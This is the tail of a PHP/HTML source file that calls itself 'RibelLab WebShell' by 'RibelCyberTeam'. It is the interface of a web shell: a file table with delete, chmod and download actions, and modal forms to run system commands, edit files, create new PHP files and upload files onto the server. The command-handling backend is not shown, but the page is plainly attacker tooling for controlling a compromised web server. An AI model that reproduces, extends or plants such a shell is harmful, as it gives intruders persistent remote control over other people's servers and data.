                                                <i class="bi bi-pencil-square"></i>
                                            </button>
                                            <a href="?path=<?= urlencode($current_path) ?>&action=download&target=<?= urlencode($fullpath) ?>" 
                                               class="px-2 py-1 bg-yellow-700 hover:bg-yellow-600 rounded text-xs" title="Download">
                                                <i class="bi bi-download"></i>
                                            </a>
                                            <button onclick="showRenameModal('<?= urlencode($fullpath) ?>', '<?= htmlspecialchars($name, ENT_QUOTES) ?>')" 
                                                    class="px-2 py-1 bg-indigo-700 hover:bg-indigo-600 rounded text-xs" title="Rename">
                                                <i class="bi bi-pencil"></i>
                                            </button>
                                            <button onclick="showChmodModal('<?= urlencode($fullpath) ?>', '<?= htmlspecialchars($name, ENT_QUOTES) ?>', '<?= $perms ?>')" 
                                                    class="px-2 py-1 bg-teal-700 hover:bg-teal-600 rounded text-xs" title="Chmod">
                                                <i class="bi bi-shield-check"></i>
                                            </button>
                                            <a href="?path=<?= urlencode($current_path) ?>&action=delete&target=<?= urlencode($fullpath) ?>" 
                                               onclick="return confirm('Delete file: <?= addslashes($name) ?>?')"
                                               class="px-2 py-1 bg-red-700 hover:bg-red-600 rounded text-xs" title="Delete">
                                                <i class="bi bi-trash"></i>
                                            </a>
                                        </div>
                                    </td>
                                </tr>
                                <?php
                            }
                            
                            if(empty($folders) && empty($files)): ?>
                            <tr>
                                <td colspan="7" class="p-8 text-center text-gray-500">
                                    <i class="bi bi-inbox text-4xl block mb-2"></i>
                                    Folder kosong
                                </td>
                            </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
            
            <!-- Stats Footer -->
            <div class="mt-4 grid grid-cols-1 md:grid-cols-3 gap-4">
                <div class="bg-gray-900 p-4 rounded-lg border border-gray-800">
                    <div class="text-gray-400 text-sm">Total Files</div>
                    <div class="text-2xl font-bold text-blue-400"><?= count($files) ?></div>
                </div>
                <div class="bg-gray-900 p-4 rounded-lg border border-gray-800">
                    <div class="text-gray-400 text-sm">Total Folders</div>
                    <div class="text-2xl font-bold text-yellow-400"><?= count($folders) ?></div>
                </div>
                <div class="bg-gray-900 p-4 rounded-lg border border-gray-800">
                    <div class="text-gray-400 text-sm">Total Size</div>
                    <div class="text-2xl font-bold text-green-400">
                        <?= formatSize(array_sum(array_map(function($f) { 
                            return filesize($f['path']);
                        }, $files))) ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Footer -->
    <div class="mt-8 text-center text-gray-500 text-sm border-t border-gray-800 pt-4">
        <p>RibelLab WebShell v<?= $VERSION ?> | RibelCyberTeam | @godposeidon</p>
        <p class="text-gray-600">Server Time: <?= date('Y-m-d H:i:s') ?> | PHP Memory: <?= round(memory_get_usage(true)/1048576, 2) ?>MB</p>
    </div>
</div>

<!-- Modals -->
<div id="modals">
    <!-- Command Modal -->
    <div id="commandModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 p-4">
        <div class="bg-gray-900 rounded-xl p-6 w-full max-w-lg border border-gray-700">
            <h3 class="text-xl font-bold mb-4 text-yellow-400">
                <i class="bi bi-terminal"></i> Execute Command
            </h3>
            <form method="POST" action="?path=<?= urlencode($current_path) ?>">
                <input type="hidden" id="cmd_type" name="cmd_type" value="system">
                <div class="space-y-4">
                    <div>
                        <label class="block text-gray-300 mb-2">Command</label>
                        <input type="text" name="command" id="command_input" required 
                               class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg code-font" 
                               placeholder="Enter command...">
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="hideModal('command')" 
                                class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg">
                            Cancel
                        </button>
                        <button type="submit" 
                                class="px-4 py-2 bg-gradient-to-r from-green-600 to-emerald-700 hover:from-green-500 hover:to-emerald-600 rounded-lg font-bold">
                            <i class="bi bi-play-fill"></i> Execute
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Edit File Modal -->
    <div id="editModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 p-4">
        <div class="bg-gray-900 rounded-xl p-6 w-full max-w-4xl border border-gray-700">
            <h3 class="text-xl font-bold mb-4 text-green-400">
                <i class="bi bi-pencil-square"></i> Edit File
            </h3>
            <form method="POST" action="?path=<?= urlencode($current_path) ?>">
                <input type="hidden" name="action" value="edit">
                <input type="hidden" id="edit_target" name="target" value="">
                <div class="space-y-4">
                    <div>
                        <label class="block text-gray-300 mb-2" id="edit_filename">File: </label>
                        <textarea name="content" id="edit_content" rows="15" 
                                  class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg font-mono text-sm"
                                  style="font-family: 'Courier New', monospace;"></textarea>
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="hideModal('edit')" 
                                class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg">
                            Cancel
                        </button>
                        <button type="submit" 
                                class="px-4 py-2 bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-500 hover:to-indigo-600 rounded-lg font-bold">
                            <i class="bi bi-save"></i> Save Changes
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Rename Modal -->
    <div id="renameModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 p-4">
        <div class="bg-gray-900 rounded-xl p-6 w-full max-w-md border border-gray-700">
            <h3 class="text-xl font-bold mb-4 text-blue-400">
                <i class="bi bi-pencil"></i> Rename
            </h3>
            <form method="POST" action="?path=<?= urlencode($current_path) ?>">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" id="rename_target" name="target" value="">
                <div class="space-y-4">
                    <div>
                        <label class="block text-gray-300 mb-2" id="rename_oldname">Old Name: </label>
                        <input type="text" name="newname" id="rename_newname" required 
                               class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg" 
                               placeholder="New name...">
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="hideModal('rename')" 
                                class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg">
                            Cancel
                        </button>
                        <button type="submit" 
                                class="px-4 py-2 bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-500 hover:to-indigo-600 rounded-lg font-bold">
                            Rename
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Chmod Modal -->
    <div id="chmodModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 p-4">
        <div class="bg-gray-900 rounded-xl p-6 w-full max-w-md border border-gray-700">
            <h3 class="text-xl font-bold mb-4 text-teal-400">
                <i class="bi bi-shield-check"></i> Change Permissions
            </h3>
            <form method="POST" action="?path=<?= urlencode($current_path) ?>">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" id="chmod_target" name="target" value="">
                <div class="space-y-4">
                    <div>
                        <label class="block text-gray-300 mb-2" id="chmod_filename">File: </label>
                        <label class="block text-gray-300 mb-2">Current: <span id="chmod_current" class="font-mono"></span></label>
                        <input type="text" name="mode" id="chmod_mode" required 
                               class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg font-mono" 
                               placeholder="e.g., 755, 644, 777" pattern="[0-7]{3,4}">
                        <div class="mt-2 text-sm text-gray-400">
                            Common: 755 (rwxr-xr-x), 644 (rw-r--r--), 777 (rwxrwxrwx)
                        </div>
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="hideModal('chmod')" 
                                class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg">
                            Cancel
                        </button>
                        <button type="submit" 
                                class="px-4 py-2 bg-gradient-to-r from-green-600 to-emerald-700 hover:from-green-500 hover:to-emerald-600 rounded-lg font-bold">
                            Change
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    
    <!-- New File Modal -->
    <div id="newFileModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 p-4">
        <div class="bg-gray-900 rounded-xl p-6 w-full max-w-md border border-gray-700">
            <h3 class="text-xl font-bold mb-4 text-blue-400">
                <i class="bi bi-file-earmark-plus"></i> New File
            </h3>
            <form method="POST" action="?path=<?= urlencode($current_path) ?>">
                <input type="hidden" name="action" value="newfile">
                <div class="space-y-4">
                    <div>
                        <label class="block text-gray-300 mb-2">Filename</label>
                        <input type="text" name="filename" required 
                               class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg" 
                               placeholder="example.php">
                    </div>
                    <div>
                        <label class="block text-gray-300 mb-2">Content</label>
                        <textarea name="content" rows="6" 
                                  class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg font-mono"
                                  placeholder="Enter file content..."></textarea>
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="hideModal('newFile')" 
                                class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg">
                            Cancel
                        </button>
                        <button type="submit" 
                                class="px-4 py-2 bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-500 hover:to-indigo-600 rounded-lg font-bold">
                            Create File
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    
    <!-- New Folder Modal -->
    <div id="newFolderModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 p-4">
        <div class="bg-gray-900 rounded-xl p-6 w-full max-w-md border border-gray-700">
            <h3 class="text-xl font-bold mb-4 text-green-400">
                <i class="bi bi-folder-plus"></i> New Folder
            </h3>
            <form method="POST" action="?path=<?= urlencode($current_path) ?>">
                <input type="hidden" name="action" value="newfolder">
                <div class="space-y-4">
                    <div>
                        <label class="block text-gray-300 mb-2">Folder Name</label>
                        <input type="text" name="foldername" required 
                               class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg" 
                               placeholder="new_folder">
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="hideModal('newFolder')" 
                                class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg">
                            Cancel
                        </button>
                        <button type="submit" 
                                class="px-4 py-2 bg-gradient-to-r from-green-600 to-emerald-700 hover:from-green-500 hover:to-emerald-600 rounded-lg font-bold">
                            Create Folder
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Upload Modal -->
    <div id="uploadModal" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 p-4">
        <div class="bg-gray-900 rounded-xl p-6 w-full max-w-md border border-gray-700">
            <h3 class="text-xl font-bold mb-4 text-purple-400">
                <i class="bi bi-cloud-upload"></i> Upload File
            </h3>
            <form method="POST" action="?path=<?= urlencode($current_path) ?>" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <div class="space-y-4">
                    <div>
                        <label class="block text-gray-300 mb-2">Select File</label>
                        <input type="file" name="upload_file" required 
                               class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg">
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="hideModal('upload')" 
                                class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg">
                            Cancel
                        </button>
                        <button type="submit" 
                                class="px-4 py-2 bg-gradient-to-r from-purple-600 to-pink-700 hover:from-purple-500 hover:to-pink-600 rounded-lg font-bold">
                            Upload File
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>

<script>
// Modal functions
function showModal(type) {
    const modal = document.getElementById(type + 'Modal');
    modal.classList.remove('hidden');
    modal.classList.add('flex');
}

function hideModal(type) {
    const modal = document.getElementById(type + 'Modal');
    modal.classList.add('hidden');
    modal.classList.remove('flex');
}

function showCommandModal(type) {
    document.getElementById('cmd_type').value = type;
    document.getElementById('command_input').focus();
    showModal('command');
}

function showEditModal(target, filename) {
    fetch('?action=view&target=' + target)
        .then(response => response.text())
        .then(content => {
            document.getElementById('edit_target').value = decodeURIComponent(target);
            document.getElementById('edit_filename').textContent = 'File: ' + filename;
            document.getElementById('edit_content').value = content;
            showModal('edit');
        })
        .catch(error => {
            alert('Error loading file: ' + error);
        });
}

function showRenameModal(target, oldname) {
    document.getElementById('rename_target').value = decodeURIComponent(target);
    document.getElementById('rename_oldname').textContent = 'Old Name: ' + oldname;
    document.getElementById('rename_newname').value = oldname;
    document.getElementById('rename_newname').focus();
    showModal('rename');
}

function showChmodModal(target, filename, current) {
    document.getElementById('chmod_target').value = decodeURIComponent(target);
    document.getElementById('chmod_filename').textContent = 'File: ' + filename;
    document.getElementById('chmod_current').textContent = current;
    document.getElementById('chmod_mode').value = current;
    document.getElementById('chmod_mode').focus();
    showModal('chmod');
}

function setQuickCommand(cmd) {
    document.getElementById('command_input').value = cmd;
    showCommandModal('system');
}

// Close modal on outside click
document.querySelectorAll('#modals > div').forEach(modal => {
    modal.addEventListener('click', function(e) {
        if(e.target === this) {
            this.classList.add('hidden');
            this.classList.remove('flex');
        }
    });
});

// Auto-focus input in modals when shown
document.addEventListener('DOMContentLoaded', function() {
    // Check for success messages
    const urlParams = new URLSearchParams(window.location.search);
    if(urlParams.has('edited') || urlParams.has('deleted') || urlParams.has('created') || 
       urlParams.has('folder_created') || urlParams.has('uploaded')) {
        setTimeout(() => {
            window.scrollTo(0, 0);
        }, 100);
    }
});
</script>

</body>
</html>